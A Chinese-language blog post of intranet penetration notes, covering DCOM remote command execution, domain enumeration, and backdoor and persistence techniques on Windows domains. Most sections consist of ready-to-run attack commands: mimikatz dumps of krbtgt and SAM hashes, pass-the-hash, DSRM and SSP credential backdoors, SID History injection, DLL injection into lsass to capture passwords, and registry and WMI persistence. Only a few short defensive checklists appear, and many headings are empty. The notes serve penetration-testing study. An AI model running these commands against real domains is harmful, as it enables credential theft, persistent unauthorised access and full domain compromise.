<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/brav0hax/</span>smbexec.git</span><br><span class="line">chmod +x install.sh &amp;&amp; ./install.sh</span><br></pre></td></tr></table></figure>

<h3 id="DCOM-在远程系统中的使用"><a href="#DCOM-在远程系统中的使用" class="headerlink" title="DCOM 在远程系统中的使用"></a>DCOM 在远程系统中的使用</h3><h4 id="通过本地-DCOM-执行命令"><a href="#通过本地-DCOM-执行命令" class="headerlink" title="通过本地 DCOM 执行命令"></a>通过本地 DCOM 执行命令</h4><p>获取DCOM程序列表：</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-CimInstance Win32_DCOMApplication</span><br><span class="line"><span class="keyword">Get</span>-WmiObject -<span class="keyword">Namespace</span> ROOT\CIMV2 -<span class="keyword">Class</span> Win32_DCOMApplication</span><br></pre></td></tr></table></figure>

<h4 id="使用-DCOM-在远程机器上执行命令"><a href="#使用-DCOM-在远程机器上执行命令" class="headerlink" title="使用 DCOM 在远程机器上执行命令"></a>使用 DCOM 在远程机器上执行命令</h4><p>1调用MMC20.Application远程执行命令</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">use</span> \\<span class="number">192.168</span>.<span class="number">1.10</span> <span class="string">&quot;admin123&quot;</span> /<span class="symbol">user:</span>test\xiaom</span><br><span class="line"><span class="variable">$com</span> = [activator]::CreateInstance([type]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;192.168.1.10&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c cmd.exe&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>2、调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span> = [Type]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;192.168.1.10&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span> = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span> = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)关于这个方法的详细内容可以参考 <span class="symbol">https:</span>/<span class="regexp">/bbs.pediy.com/thread</span><span class="number">-226540-1</span>.htm</span><br></pre></td></tr></table></figure>

<h3 id="SPN-在域环境中的应用"><a href="#SPN-在域环境中的应用" class="headerlink" title="SPN 在域环境中的应用"></a>SPN 在域环境中的应用</h3><h3 id="Exchange-邮件服务器安全防范"><a href="#Exchange-邮件服务器安全防范" class="headerlink" title="Exchange 邮件服务器安全防范"></a>Exchange 邮件服务器安全防范</h3><p>查看邮件数据库</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//查询之前需要安装命令</span><br><span class="line">add-pssnapin microsoft.exchange *</span><br><span class="line">Get-MailboxDatabase -server <span class="string">&quot;Exchange1&quot;</span></span><br><span class="line">Get-MailboxDatabase -Identity &#x27;Mailbox Database 1894576043&#x27; | Format-List Name,EdbFilePath,LogFolderPath</span><br></pre></td></tr></table></figure>

<h2 id="域控制器安全"><a href="#域控制器安全" class="headerlink" title="域控制器安全"></a>域控制器安全</h2><h4 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h4><h3 id="导出-ntds-dit-中的散列值"><a href="#导出-ntds-dit-中的散列值" class="headerlink" title="导出 ntds.dit 中的散列值"></a>导出 ntds.dit 中的散列值</h3><h3 id="利用-dcsync-获取散列值"><a href="#利用-dcsync-获取散列值" class="headerlink" title="利用 dcsync 获取散列值"></a>利用 dcsync 获取散列值</h3><h3 id="使用-MSF-获取散列值"><a href="#使用-MSF-获取散列值" class="headerlink" title="使用 MSF 获取散列值"></a>使用 MSF 获取散列值</h3><h3 id="Kerberos-与用户提权漏洞分析与防范"><a href="#Kerberos-与用户提权漏洞分析与防范" class="headerlink" title="Kerberos 与用户提权漏洞分析与防范"></a>Kerberos 与用户提权漏洞分析与防范</h3><h2 id="跨域攻击分析与防御"><a href="#跨域攻击分析与防御" class="headerlink" title="跨域攻击分析与防御"></a>跨域攻击分析与防御</h2><h3 id="利用域信任关系的跨域攻击分析"><a href="#利用域信任关系的跨域攻击分析" class="headerlink" title="利用域信任关系的跨域攻击分析"></a>利用域信任关系的跨域攻击分析</h3><h4 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h4><p>这里说到了lg.exe这个工具，能够用来枚举远程主机用户和组的信息。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//枚举域中的用户组</span><br><span class="line"><span class="keyword">lg</span>.<span class="keyword">exe</span> &lt;domain name&gt;\.</span><br><span class="line"></span><br><span class="line">//枚举远程机器的本地组用户</span><br><span class="line"><span class="keyword">lg</span>.<span class="keyword">exe</span> \\dc2012</span><br><span class="line"></span><br><span class="line">//获取远程用户中全部用户的SID</span><br><span class="line"><span class="keyword">lg</span>.<span class="keyword">exe</span> \\dc2012 -<span class="keyword">lu</span> -sidsout</span><br><span class="line"></span><br><span class="line">//获取指定组中所有成员的SID</span><br><span class="line"><span class="keyword">lg</span>.<span class="keyword">exe</span> \\dc2012\administrators -sidsout</span><br></pre></td></tr></table></figure>

<h3 id="防范跨域攻击"><a href="#防范跨域攻击" class="headerlink" title="防范跨域攻击"></a>防范跨域攻击</h3><h2 id="权限维持分析及防御"><a href="#权限维持分析及防御" class="headerlink" title="权限维持分析及防御"></a>权限维持分析及防御</h2><h3 id="操作系统后门分析与防范"><a href="#操作系统后门分析与防范" class="headerlink" title="操作系统后门分析与防范"></a>操作系统后门分析与防范</h3><h4 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h4><h4 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h4><p>这个在ATT&amp;CK中的Persistence一章中的Registry Run Keys / Startup Folder中有提到。命令如下：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">Microsoft</span></span><span class="tag">\<span class="name">Windows</span></span><span class="tag">\<span class="name">CurrentVersion</span></span><span class="tag">\<span class="name">Run</span></span> /v RegRun /t REG_SZ /d &quot;c:<span class="tag">\<span class="name">windows</span></span><span class="tag">\<span class="name">system</span></span>32<span class="tag">\<span class="name">calc</span></span>.exe&quot;</span><br></pre></td></tr></table></figure>

<h4 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h4><h4 id="meterpreter-后门"><a href="#meterpreter-后门" class="headerlink" title="meterpreter 后门"></a>meterpreter 后门</h4><h4 id="Cymothoa-后门"><a href="#Cymothoa-后门" class="headerlink" title="Cymothoa 后门"></a>Cymothoa 后门</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cymothoa/">https://sourceforge.net/projects/cymothoa/</a></p>
<p>安装可参照<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/88834099">https://blog.csdn.net/qq_17204441/article/details/88834099</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cymothoa -s 0 -p <span class="tag">&lt;<span class="name">process</span> <span class="attr">id</span>&gt;</span> -y <span class="tag">&lt;<span class="name">port</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>安装成功后使用nc等工具连接设置的端口即可。</p>
<h4 id="WMI-后门"><a href="#WMI-后门" class="headerlink" title="WMI 后门"></a>WMI 后门</h4><p>WMI后门的特征是无文件和无进程，将代码加密存储于WMI中，达到所谓的无文件，当设定的条件被满足时，系统将自动启动Powershell进程去执行后门程序，执行后进程将会消失。</p>
<p>Empire下有WMI相关的模块可以使用：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell<span class="regexp">/persistence/</span>elevated/wmi</span><br></pre></td></tr></table></figure>

<p>可以在目标主机中使用命令查看存在的后门：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-WMIObject -Namespace root\<span class="keyword">Subscription</span> -<span class="keyword">Class</span> CommandLineEventConsumer</span><br></pre></td></tr></table></figure>

<p>清理WMI后门的方法：删除自动运行列表中的恶意WMI条目，使用Get-WMIObject命令删除与WMI持久化相关的组件。</p>
<h3 id="Web-后门"><a href="#Web-后门" class="headerlink" title="Web 后门"></a>Web 后门</h3><h4 id="Nishang-下的-WEBShell"><a href="#Nishang-下的-WEBShell" class="headerlink" title="Nishang 下的 WEBShell"></a>Nishang 下的 WEBShell</h4><h4 id="Weevely-后门"><a href="#Weevely-后门" class="headerlink" title="Weevely 后门"></a>Weevely 后门</h4><h4 id="webacoo-后门工具"><a href="#webacoo-后门工具" class="headerlink" title="webacoo 后门工具"></a>webacoo 后门工具</h4><h3 id="域控制器权限持久化分析与防范"><a href="#域控制器权限持久化分析与防范" class="headerlink" title="域控制器权限持久化分析与防范"></a>域控制器权限持久化分析与防范</h3><h4 id="DSRM-后门"><a href="#DSRM-后门" class="headerlink" title="DSRM 后门"></a>DSRM 后门</h4><p>使用mimikatz查看krbtgt账户密码hash值</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::lsa /patch /name:krbtgt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>查看SAM文件中本地管理员的NTLM HASH值</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>将DSRM hash和kebtgt的密码同步：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line"><span class="keyword">set</span> dsrm <span class="keyword">password</span></span><br><span class="line"><span class="keyword">SYNC</span> <span class="keyword">FROM</span> <span class="keyword">DOMAIN</span> <span class="keyword">account</span> krbtgt</span><br><span class="line">q</span><br></pre></td></tr></table></figure>

<p>再次查看会发现DSRM密码和krbtgt的密码相同，然后修改DSRM的登陆方式，这个注册表键值为2表示”在任何情况下都可以使用DSRM管理员账号登陆域控制器”：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:<span class="tag">\<span class="name">system</span></span><span class="tag">\<span class="name">currentcontrolset</span></span><span class="tag">\<span class="name">control</span></span><span class="tag">\<span class="name">lsa</span></span><span class="tag">\<span class="name">&quot;</span></span> -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>

<p>使用mimikatz进行pth攻击：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">&quot;privilege::Debug&quot;</span> <span class="string">&quot;sekurlsa::pth /domain:DC /user:administrator /ntlm:XXXXXXXXXXX&quot;</span></span><br></pre></td></tr></table></figure>

<p>DSRM后门防御措施：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">检查hklm<span class="tag">\<span class="name">system</span></span><span class="tag">\<span class="name">currentcontrolset</span></span><span class="tag">\<span class="name">control</span></span><span class="tag">\<span class="name">lsa</span></span><span class="tag">\<span class="name">dsrmadminlogonbehavior</span></span>注册表键值的值，确认值为1</span><br><span class="line">定期修改DSRM的账号</span><br><span class="line">经常检查ID为4794的日志</span><br></pre></td></tr></table></figure>

<h4 id="SSP-维持域控权限"><a href="#SSP-维持域控权限" class="headerlink" title="SSP 维持域控权限"></a>SSP 维持域控权限</h4><p>方式一：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;misc::memssp&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>注销之后执行命令查看明文密码：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe cat c:<span class="tag">\<span class="name">windows</span></span><span class="tag">\<span class="name">system</span></span>32<span class="tag">\<span class="name">mimilsa</span></span>.log</span><br></pre></td></tr></table></figure>

<p>方式二：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe cp .<span class="tag">\<span class="name">mimilib</span></span>.dll C:<span class="tag">\<span class="name">Windows</span></span><span class="tag">\<span class="name">System</span></span>32<span class="tag">\</span></span><br><span class="line">Set-ItemProperty &quot;hklm:<span class="tag">\<span class="name">system</span></span><span class="tag">\<span class="name">currentcontrolset</span></span><span class="tag">\<span class="name">control</span></span><span class="tag">\<span class="name">lsa</span></span><span class="tag">\<span class="name">&quot;</span></span> -name &quot;Security Packages&quot; -value &quot;mimilib.dll&quot;</span><br></pre></td></tr></table></figure>

<p>重启之后使用命令查看密码：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe cat c:<span class="tag">\<span class="name">windows</span></span><span class="tag">\<span class="name">system</span></span>32<span class="tag">\<span class="name">kiwissp</span></span>.log</span><br></pre></td></tr></table></figure>

<p>防御措施：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看hklm<span class="tag">\<span class="name">system</span></span><span class="tag">\<span class="name">currentcontrolset</span></span><span class="tag">\<span class="name">control</span></span><span class="tag">\<span class="name">lsa</span></span><span class="tag">\<span class="name">Security</span></span> Packages注册表项是否含有可疑的DLL文件</span><br><span class="line">检查C:<span class="tag">\<span class="name">windows</span></span><span class="tag">\<span class="name">system</span></span>32<span class="tag">\<span class="name">目</span></span>录下是否存在可疑的文件</span><br><span class="line">第三方工具检查</span><br></pre></td></tr></table></figure>

<h4 id="SID-History-后门"><a href="#SID-History-后门" class="headerlink" title="SID History 后门"></a>SID History 后门</h4><p>test为恶意账户，administrator</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-module ActiveDirectory</span><br><span class="line">Get-ADUser xiaom -Properties sidhistory</span><br><span class="line"></span><br><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::Debug&quot;</span> <span class="string">&quot;sid::patch&quot;</span> <span class="string">&quot;sid::add /sam:xiaom /new:administrator&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>此时使用xiaom账号可以访问域控</p>
<h4 id="Golden-Ticket-and-Silver-Ticket"><a href="#Golden-Ticket-and-Silver-Ticket" class="headerlink" title="Golden Ticket and Silver Ticket"></a>Golden Ticket and Silver Ticket</h4><h4 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h4><h4 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h4><p>这个方法要使用Invoke-ReflectivePEInjection.ps1将HookPasswordChange.dll注入内存，在目标系统中启动管理员权限的powershell：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\Invoke-<span class="module-access"><span class="module"><span class="identifier">ReflectivePEInjection</span>.</span></span>ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath <span class="module-access"><span class="module"><span class="identifier">HookPasswordChange</span>.</span></span>dll -procname lsass</span><br></pre></td></tr></table></figure>

<p>此时如果再修改用户密码则修改之后的密码会记录在C:\windows\Temp\password.txt文件中。</p>
<p>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
<p>参考地址：<a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p>
<h3 id="Nishang-下的脚本后门分析与防范"><a href="#Nishang-下的脚本后门分析与防范" class="headerlink" title="Nishang 下的脚本后门分析与防范"></a>Nishang 下的脚本后门分析与防范</h3><h4 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h4><h4 id="Add-scrnSaveBackdoor"><a href="#Add-scrnSaveBackdoor" class="headerlink" title="Add-scrnSaveBackdoor"></a>Add-scrnSaveBackdoor</h4><h4 id="Execute-OnTime"><a href="#Execute-OnTime" class="headerlink" title="Execute-OnTime"></a>Execute-OnTime</h4><h4 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h4></div><div class="article-licensing box"><div class="licensing-title"><p>内网渗透</p><p><a href="http://example.com/2020/07/29/intranet/">http://example.com/2020/07/29/intranet/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>lll</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2020-07-29</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-10-19</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/08/03/ctfd/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CTFd 搭建</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/07/07/cobalt-strike/"><span class="level-item">Cobalt Strike 相关</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="lll"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">lll</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">42</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">13</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1klnd" target="_blank" rel="noopener">关注我</a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#内网信息收集"><span class="level-left"><span class="level-item">1</span><span class="level-item">内网信息收集</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#收集本机信息"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">收集本机信息</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#手动收集"><span class="level-left"><span class="level-item">1.2.1</span><span class="level-item">手动收集</span></span></a></li><li><a class="level is-mobile" href="#自动收集"><span class="level-left"><span class="level-item">1.2.2</span><span class="level-item">自动收集</span></span></a></li><li><a class="level is-mobile" href="#Empire-下的主机信息收集"><span class="level-left"><span class="level-item">1.2.3</span><span class="level-item">Empire 下的主机信息收集</span></span></a></li></ul></li><li><a class="level is-mobile" href="#查询当前权限"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">查询当前权限</span></span></a></li><li><a class="level is-mobile" href="#判断是否存在域"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">判断是否存在域</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#查看网络配置"><span class="level-left"><span class="level-item">1.4.1</span><span class="level-item">查看网络配置</span></span></a></li><li><a class="level is-mobile" href="#查看系统详细信息"><span class="level-left"><span class="level-item">1.4.2</span><span class="level-item">查看系统详细信息</span></span></a></li><li><a class="level is-mobile" href="#查询当前登陆域及登录用户信息"><span class="level-left"><span class="level-item">1.4.3</span><span class="level-item">查询当前登陆域及登录用户信息</span></span></a></li><li><a class="level is-mobile" href="#判断主域"><span class="level-left"><span class="level-item">1.4.4</span><span class="level-item">判断主域</span></span></a></li></ul></li><li><a class="level is-mobile" href="#探测域内存活主机"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">探测域内存活主机</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#使用-NetBIOS-快速探测内网"><span class="level-left"><span class="level-item">1.5.1</span><span class="level-item">使用 NetBIOS 快速探测内网</span></span></a></li><li><a class="level is-mobile" href="#利用-ICMP-协议快速探测内网"><span class="level-left"><span class="level-item">1.5.2</span><span class="level-item">利用 ICMP 协议快速探测内网</span></span></a></li><li><a class="level is-mobile" href="#利用-ARP-探测内网"><span class="level-left"><span class="level-item">1.5.3</span><span class="level-item">利用 ARP 探测内网</span></span></a></li><li><a class="level is-mobile" href="#通过常规-TCP-UDP-端口扫描探测内网"><span class="level-left"><span class="level-item">1.5.4</span><span class="level-item">通过常规 TCP/UDP 端口扫描探测内网</span></span></a></li></ul></li><li><a class="level is-mobile" href="#扫描域内端口"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">扫描域内端口</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#利用-telnet-扫描"><span class="level-left"><span class="level-item">1.6.1</span><span class="level-item">利用 telnet 扫描</span></span></a></li><li><a class="level is-mobile" href="#S-扫描器"><span class="level-left"><span class="level-item">1.6.2</span><span class="level-item">S 扫描器</span></span></a></li><li><a class="level is-mobile" href="#Metasploit"><span class="level-left"><span class="level-item">1.6.3</span><span class="level-item">Metasploit</span></span></a></li><li><a class="level is-mobile" href="#PowerSploit-的-Invoke-portscan-ps1"><span class="level-left"><span class="level-item">1.6.4</span><span class="level-item">PowerSploit 的 Invoke-portscan.ps1</span></span></a></li><li><a class="level is-mobile" href="#Nishang-的-Invoke-PortScan-模块"><span class="level-left"><span class="level-item">1.6.5</span><span class="level-item">Nishang 的 Invoke-PortScan 模块</span></span></a></li><li><a class="level is-mobile" href="#Banner-信息"><span class="level-left"><span class="level-item">1.6.6</span><span class="level-item">Banner 信息</span></span></a></li></ul></li><li><a class="level is-mobile" href="#收集域内基础信息"><span class="level-left"><span class="level-item">1.7</span><span class="level-item">收集域内基础信息</span></span></a></li><li><a class="level is-mobile" href="#查找域控制器"><span class="level-left"><span class="level-item">1.8</span><span class="level-item">查找域控制器</span></span></a></li><li><a class="level is-mobile" href="#获取域内用户和管理员信息"><span class="level-left"><span class="level-item">1.9</span><span class="level-item">获取域内用户和管理员信息</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#查询域用户列表"><span class="level-left"><span class="level-item">1.9.1</span><span class="level-item">查询域用户列表</span></span></a></li><li><a class="level is-mobile" href="#查询域管理员用户组"><span class="level-left"><span class="level-item">1.9.2</span><span class="level-item">查询域管理员用户组</span></span></a></li></ul></li><li><a class="level is-mobile" href="#定位域管理员"><span class="level-left"><span class="level-item">1.10</span><span class="level-item">定位域管理员</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-1"><span class="level-left"><span class="level-item">1.10.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#常用域管理员定位工具"><span class="level-left"><span class="level-item">1.10.2</span><span class="level-item">常用域管理员定位工具</span></span></a></li></ul></li><li><a class="level is-mobile" href="#查找域管理进程"><span class="level-left"><span class="level-item">1.11</span><span class="level-item">查找域管理进程</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#本机检查"><span class="level-left"><span class="level-item">1.11.1</span><span class="level-item">本机检查</span></span></a></li><li><a class="level is-mobile" href="#查询域控制器的域用户会话"><span class="level-left"><span class="level-item">1.11.2</span><span class="level-item">查询域控制器的域用户会话</span></span></a></li><li><a class="level is-mobile" href="#查询远程系统中运行的任务"><span class="level-left"><span class="level-item">1.11.3</span><span class="level-item">查询远程系统中运行的任务</span></span></a></li><li><a class="level is-mobile" href="#扫描远程系统的-NetBIOS-信息"><span class="level-left"><span class="level-item">1.11.4</span><span class="level-item">扫描远程系统的 NetBIOS 信息</span></span></a></li></ul></li><li><a class="level is-mobile" href="#利用-PowerShell"><span class="level-left"><span class="level-item">1.12</span><span class="level-item">利用 PowerShell</span></span></a></li><li><a class="level is-mobile" href="#域分析工具-BloodHound"><span class="level-left"><span class="level-item">1.13</span><span class="level-item">域分析工具 BloodHound</span></span></a></li><li><a class="level is-mobile" href="#敏感数据的防护"><span class="level-left"><span class="level-item">1.14</span><span class="level-item">敏感数据的防护</span></span></a></li><li><a class="level is-mobile" href="#分析域内网段划分情况和拓扑结构"><span class="level-left"><span class="level-item">1.15</span><span class="level-item">分析域内网段划分情况和拓扑结构</span></span></a></li></ul></li><li><a class="level is-mobile" href="#隐藏通信隧道技术"><span class="level-left"><span class="level-item">2</span><span class="level-item">隐藏通信隧道技术</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#基础知识"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">基础知识</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-2"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#判断内网连通性"><span class="level-left"><span class="level-item">2.1.2</span><span class="level-item">判断内网连通性</span></span></a></li></ul></li><li><a class="level is-mobile" href="#网络层隧道"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">网络层隧道</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#IPv6-隧道"><span class="level-left"><span class="level-item">2.2.1</span><span class="level-item">IPv6 隧道</span></span></a></li><li><a class="level is-mobile" href="#ICMP-隧道"><span class="level-left"><span class="level-item">2.2.2</span><span class="level-item">ICMP 隧道</span></span></a></li></ul></li><li><a class="level is-mobile" href="#传输层隧道技术"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">传输层隧道技术</span></span></a></li><li><a class="level is-mobile" href="#应用层隧道技术"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">应用层隧道技术</span></span></a></li><li><a class="level is-mobile" href="#Socks-代理"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">Socks 代理</span></span></a></li><li><a class="level is-mobile" href="#压缩数据"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">压缩数据</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#rar-exe"><span class="level-left"><span class="level-item">2.6.1</span><span class="level-item">rar.exe</span></span></a></li><li><a class="level is-mobile" href="#7zip"><span class="level-left"><span class="level-item">2.6.2</span><span class="level-item">7zip</span></span></a></li></ul></li><li><a class="level is-mobile" href="#上传和下载"><span class="level-left"><span class="level-item">2.7</span><span 